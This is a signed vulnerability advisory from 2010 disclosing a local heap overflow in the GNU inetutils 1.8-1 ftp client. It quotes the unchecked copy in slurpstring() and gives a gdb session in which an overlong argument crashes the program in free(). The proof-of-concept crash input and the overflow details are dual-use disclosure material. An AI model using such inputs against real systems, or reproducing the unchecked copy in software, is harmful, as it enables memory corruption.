@@ -1,0 +1,102 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+
+Title: GNU inetutils 1.8-1 ftp client Heap Overflow
+Date: Dec 07 2010
+Author: Rew
+Software Link: http://ftp.gnu.org/gnu/inetutils/inetutils-1.8.tar.gz
+Version: 1.8-1
+Tested on: Arch Linux (up to date)
+CVE: NA (0day)
+
+===========================================================================
+
+Here's a cute little bug just for kicks.  This is only triggerable by
+the local user, so exploitation would get you absolutely nowhere, but
+meh :P
+
+GNU inetutils ftp (shipped with linux and other *nix's) suffers a heap
+overflow while parsing command arguments (but ONLY when the argument is
+NOT passed on the same line.) If you run any command (open, user, cd,
+mkdir, etc) without an argument, ftp will prompt you for an argument
+with readline().  It will then copy this input into a 200 byte buffer
+without first checking it's length.  NOTE: Some distros might modify
+this binary.  It didn't seem to work on the default Mint ftp client
+(maybe a Ubuntu thing?) but the default Arch binary is vulnerable.  Your
+results may vary.  Download from GNU if you have doubts.
+
+- --- ftp/main.c:slurpstring() ---
+
+406: char *sb = stringbase;     <--- This is our input. (can be massive)
+407: char *ap = argbase;        <--- This buffer is 200 bytes.
+
+458: S1:
+
+463: case '\0':
+464:  goto OUT;
+
+474: default:
+475:  *ap++ = *sb++;		<--- Heap overflow
+476:  got_one = 1;
+477:  goto S1;
+478: }
+
+- --------------------------------
+
+backtrace at overflow:
+main()->cmdscanner()->cd()->another()->makeargv()->slurpstring()
+
+The segfault below occurs later, when free() is called on an overwritten
+pointer @ 684 bytes.
+
+===========================================================================
+
+rew@WOPR ~ $ pacman -Q inetutils
+inetutils 1.8-1
+
+rew@WOPR ~ $ gdb ftp
+GNU gdb (GDB) 7.2
+Copyright (C) 2010 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later
+<http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu".
+Reading symbols from /usr/bin/ftp...(no debugging symbols found)...done.
+
+(gdb) run
+Starting program: /usr/bin/ftp
+ftp> open
+(to) AAAAAAAA ... [x684] ... AAAAAAAABBBB
+usage: open host-name [port]
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb8dc1 in free () from /lib/libc.so.6
+(gdb) i r
+eax            0x0	0
+ecx            0x1	1
+edx            0x42424239	1111638329
+ebx            0xb7f8fff4	-1208418316
+esp            0xbffff818	0xbffff818
+ebp            0xbffff828	0xbffff828
+esi            0x8064518	134628632
+edi            0x8064be0	134630368
+eip            0xb7eb8dc1	0xb7eb8dc1 <free+49>
+eflags         0x210216	[ PF AF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.11 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+
+iEYEARECAAYFAkz+xCwACgkQy2WYMxSouUxJgACePkKDrYlTuj0UaU6s0NmjVWKZ
+uBQAoJXka83R8QvgzmEj0yF0B9Eni40Y
+=SUzV
+-----END PGP SIGNATURE-----
